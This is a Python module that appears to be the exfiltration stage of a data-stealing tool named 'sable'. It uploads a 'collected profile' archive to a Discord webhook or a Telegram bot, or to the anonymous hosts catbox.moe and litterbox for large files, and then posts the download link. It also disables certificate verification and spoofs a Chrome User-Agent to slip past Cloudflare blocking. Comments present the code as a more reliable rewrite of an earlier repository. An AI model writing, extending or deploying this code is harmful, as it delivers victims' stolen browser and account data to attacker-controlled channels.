"""Transmit the archive to the relay.

stdlib urllib only. The status code is checked explicitly: the source repository
discarded the response object and logged success unconditionally, so a 401 from a
dead webhook read as a delivery. Non-2xx raises.

The uploaded filename is the archive's real name, and the content type is derived
from that same name, so the extension can never disagree with the bytes.
"""

from __future__ import annotations

import json
import secrets
import ssl
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, Final

from . import log

_TIMEOUT: Final[float] = 10.0
_ATTEMPTS: Final[int] = 3
# The third failure raises; the 8 s ceiling is never reached because there is no
# fourth attempt.
_BACKOFF: Final[tuple[float, ...]] = (2.0, 4.0)

_CAPTION_LIMIT: Final[int] = 1024
_MESSAGE_LIMIT: Final[int] = 1900
_MAX_RESPONSE: Final[int] = 8 * 1024
_MAX_UPLOAD: Final[int] = 2 * 1024 * 1024 * 1024

# Link relays. A webhook carries a message and a file, and its file ceiling belongs to
# the platform: 10 MB on a plain Discord server. A collected profile is hundreds of
# megabytes, so "send the file" and "send a link to the file" are different features,
# not different settings. These two hosts are anonymous, accept multipart, and answer
# with a bare URL, which is why they are here rather than an authenticated bucket.
#
# Catbox keeps a file indefinitely and stops at 200 MB. Litterbox is the same
# operators with a 1 GB ceiling and a fixed expiry, which is the honest place for an
# archive too big to keep.
_CATBOX: Final[str] = "https://catbox.moe/user/api.php"
_LITTERBOX: Final[str] = "https://litterbox.catbox.moe/resources/internals/api.php"
_LITTERBOX_TIME: Final[str] = "72h"
_CATBOX_MAX: Final[int] = 190 * 1024 * 1024
_LITTERBOX_MAX: Final[int] = 950 * 1024 * 1024

# A 10 s timeout is right for a message and wrong for 400 MB. The floor is a slow but
# working uplink; the ceiling keeps a wedged socket from holding the process forever.
_MIN_THROUGHPUT: Final[int] = 128 * 1024
_MIN_UPLOAD_TIMEOUT: Final[float] = 60.0
_MAX_UPLOAD_TIMEOUT: Final[float] = 1800.0

_CONTENT_TYPES: Final[dict[str, str]] = {
    ".zip": "application/zip",
    ".rar": "application/vnd.rar",
}

# urllib sends ``Python-urllib/3.x`` when nothing is set, and Cloudflare answers that
# with 1010 before the request ever reaches the relay. Measured against a live webhook:
# the default agent got 403 with the body ``error code: 1010``, and the same request
# with this header got 204. The header is not decoration.
_USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

_SSL: Final[ssl.SSLContext] = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode = ssl.CERT_NONE


class RelayError(RuntimeError):
    """Delivery failed. Raised, never returned, so it cannot be ignored."""


def transmit(cfg: Any, archive: Path) -> None:
    """Send ``archive`` to the configured relay. Raises RelayError on failure."""
    if not archive.is_file():
        raise RelayError(f"{archive.name}: archive is missing")

    kind = cfg.relay.kind
    endpoint = cfg.relay.endpoint
    failure: Exception | None = None

    for attempt in range(1, _ATTEMPTS + 1):
        try:
            if kind == "telegram":
                _send_telegram(endpoint, archive)
            elif kind == "link":
                _send_link(endpoint, archive)
            else:
                _send_https(endpoint, archive)
            log.logger.debug("relay: delivered %s on attempt %d", archive.name, attempt)
            return
        except Exception as exc:
            failure = exc
            log.logger.debug("relay: attempt %d failed: %s", attempt, exc)
            if attempt < _ATTEMPTS:
                time.sleep(_BACKOFF[attempt - 1])

    raise RelayError(f"transmit failed after {_ATTEMPTS} attempts: {failure}") from failure


def _read(archive: Path) -> bytes:
    size = archive.stat().st_size
    if size <= 0:
        raise RelayError(f"{archive.name}: archive is empty")
    if size > _MAX_UPLOAD:
        raise RelayError(f"{archive.name}: {size} bytes exceeds the upload cap")
    return archive.read_bytes()


def _content_type(archive: Path) -> str:
    suffix = archive.suffix.lower()
    if suffix not in _CONTENT_TYPES:
        raise RelayError(f"{archive.name}: no content type for {suffix!r}")
    return _CONTENT_TYPES[suffix]


def _caption(archive: Path) -> str:
    text = f"sable {archive.name} {archive.stat().st_size} bytes"
    return _fit(text, _CAPTION_LIMIT)


def _fit(text: str, limit: int) -> str:
    # Telegram rejects a caption over 1024 characters outright. The source
    # repository built ~2450 and the upload failed with nothing logged.
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def _multipart(
    fields: dict[str, str],
    file_field: str,
    filename: str,
    payload: bytes,
    content_type: str,
) -> tuple[bytes, str]:
    boundary = "----sable" + secrets.token_hex(16)
    parts: list[bytes] = []

    for name, value in fields.items():
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n".encode()
        )

    parts.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; '
        f'filename="{filename}"\r\nContent-Type: {content_type}\r\n\r\n'.encode()
    )
    parts.append(payload)
    parts.append(f"\r\n--{boundary}--\r\n".encode())

    return b"".join(parts), boundary


def _post(url: str, body: bytes, boundary: str, timeout: float = _TIMEOUT) -> bytes:
    request = urllib.request.Request(url, data=body, method="POST")
    request.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    request.add_header("Content-Length", str(len(body)))
    request.add_header("User-Agent", _USER_AGENT)

    try:
        with urllib.request.urlopen(request, timeout=timeout, context=_SSL) as response:
            status = int(response.status)
            answer = response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        raise RelayError(f"relay returned http {exc.code}") from exc
    except urllib.error.URLError as exc:
        raise RelayError(f"relay unreachable: {exc.reason}") from exc

    if not 200 <= status < 300:
        raise RelayError(f"relay returned http {status}")
    return answer


def _post_json(url: str, document: dict[str, str]) -> bytes:
    payload = json.dumps(document).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    request.add_header("Content-Type", "application/json")
    request.add_header("Content-Length", str(len(payload)))
    request.add_header("User-Agent", _USER_AGENT)

    try:
        with urllib.request.urlopen(request, timeout=_TIMEOUT, context=_SSL) as response:
            status = int(response.status)
            answer = response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        raise RelayError(f"relay returned http {exc.code}") from exc
    except urllib.error.URLError as exc:
        raise RelayError(f"relay unreachable: {exc.reason}") from exc

    if not 200 <= status < 300:
        raise RelayError(f"relay returned http {status}")
    return answer


def _send_https(endpoint: str, archive: Path) -> None:
    payload = _read(archive)
    fields = {"payload_json": json.dumps({"content": _caption(archive)})}
    body, boundary = _multipart(
        fields, "files[0]", archive.name, payload, _content_type(archive)
    )
    _post(endpoint, body, boundary, _upload_timeout(len(payload)))


def _split_telegram(endpoint: str) -> tuple[str, str]:
    parts = endpoint.split("$")
    if len(parts) != 2 or not parts[0] or not parts[1]:
        raise RelayError("telegram endpoint must be token$chat")
    return parts[0], parts[1]


def _send_telegram(endpoint: str, archive: Path) -> None:
    token, chat = _split_telegram(endpoint)
    payload = _read(archive)
    fields = {"chat_id": chat, "caption": _caption(archive)}
    body, boundary = _multipart(
        fields, "document", archive.name, payload, _content_type(archive)
    )
    _post(
        f"https://api.telegram.org/bot{token}/sendDocument",
        body,
        boundary,
        _upload_timeout(len(payload)),
    )


# --- link relay ---------------------------------------------------------------


def _upload_timeout(size: int) -> float:
    """A timeout sized for the body, not for a message."""
    estimate = size / _MIN_THROUGHPUT
    return min(max(_MIN_UPLOAD_TIMEOUT, estimate), _MAX_UPLOAD_TIMEOUT)


def _link_host(size: int) -> tuple[str, dict[str, str]]:
    """The host that will take a file this size. Raises when neither will."""
    if size <= _CATBOX_MAX:
        return _CATBOX, {"reqtype": "fileupload"}
    if size <= _LITTERBOX_MAX:
        return _LITTERBOX, {"reqtype": "fileupload", "time": _LITTERBOX_TIME}
    raise RelayError(
        f"archive is {size} bytes and the largest link host takes {_LITTERBOX_MAX}"
    )


def _link_message(archive: Path, url: str) -> str:
    return _fit(f"sable {archive.name} {archive.stat().st_size} bytes\n{url}", _MESSAGE_LIMIT)


def _send_link(endpoint: str, archive: Path) -> None:
    """Upload to an anonymous host, then post the URL to the webhook.

    Two hops, two failure modes, and both have to be checked: the host answers with
    the URL as plain text, and the webhook answers with a status code. A host that
    returns an HTML error page with a 200 is the shape this guards against — the body
    is checked for a scheme, not for "not empty".
    """
    payload = _read(archive)
    host, fields = _link_host(len(payload))

    body, boundary = _multipart(
        fields, "fileToUpload", archive.name, payload, _content_type(archive)
    )
    answer = _post(host, body, boundary, _upload_timeout(len(payload)))

    url = answer.decode("utf-8", "replace").strip()
    if not url.startswith("https://") and not url.startswith("http://"):
        raise RelayError(f"link host returned no url: {url[:120]!r}")

    log.logger.debug("relay: hosted %s at %s", archive.name, url)
    _post_json(endpoint, {"content": _link_message(archive, url)})


__all__ = ["RelayError", "transmit"]
